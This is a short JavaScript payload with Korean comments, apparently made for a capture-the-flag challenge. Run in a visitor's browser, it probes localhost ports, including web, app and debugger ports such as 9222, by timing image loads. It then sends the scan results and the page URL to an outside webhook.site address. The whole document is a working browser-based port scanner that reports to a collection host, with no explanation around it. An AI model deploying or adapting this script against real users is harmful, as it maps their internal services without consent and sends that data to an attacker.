(async () => {
    const WEBHOOK = 'https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3';
    
    // 1. 스캔할 포트 목록 (의심가는 포트 총집합)
    const ports = [
        80, 8000, 8001, 8008, 8080, 8081, 8888, // 웹
        3000, 4000, 5000, 5001, 5002,           // 앱
        9000, 9001, 9222,                       // 디버거/관리도구
        1337                                    // CTF
    ];

    const results = {};

    // 2. 이미지 태그를 이용한 포트 스캔 함수
    const checkPort = (port) => {
        return new Promise((resolve) => {
            const img = new Image();
            const start = Date.now();
            let isResolved = false;

            // 타임아웃 설정 (2초) - 응답이 너무 느리면 닫힌/필터링된 것으로 간주
            const timeout = setTimeout(() => {
                if (!isResolved) {
                    isResolved = true;
                    resolve({ port, status: 'TIMEOUT', time: Date.now() - start });
                }
            }, 2000);

            // 포트가 열려있어서 무언가(HTML, 이미지 아님)를 반환하면
            // 브라우저는 "이미지가 깨졌다"고 판단하여 onerror를 트리거합니다.
            // 즉, onerror가 빨리 뜨면 -> 포트가 열려있음 (HTTP 서버 있음)
            img.onerror = () => {
                if (!isResolved) {
                    isResolved = true;
                    clearTimeout(timeout);
                    resolve({ port, status: 'OPEN (onerror)', time: Date.now() - start });
                }
            };

            // 만약 진짜 이미지라면 onload가 뜸 (드문 케이스)
            img.onload = () => {
                if (!isResolved) {
                    isResolved = true;
                    clearTimeout(timeout);
                    resolve({ port, status: 'OPEN (onload)', time: Date.now() - start });
                }
            };

            // 연결 자체가 거부되면(RST), 브라우저는 즉시 에러를 낼 수도 있고
            // 타임아웃까지 갈 수도 있습니다. 보통 닫힌 포트는 시간이 조금 더 걸리거나 즉시 에러입니다.
            img.src = `http://127.0.0.1:${port}/favicon.ico?r=${Math.random()}`;
        });
    };

    // 3. 순차적으로 스캔
    const scanPromises = ports.map(port => checkPort(port));
    const scanData = await Promise.all(scanPromises);

    scanData.forEach(r => {
        results[r.port] = r.status + ` (${r.time}ms)`;
    });

    // 4. 데이터 전송
    fetch(WEBHOOK, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
            msg: "Blind Image Port Scan",
            scanResults: results,
            location: window.location.href
        })
    });
})();
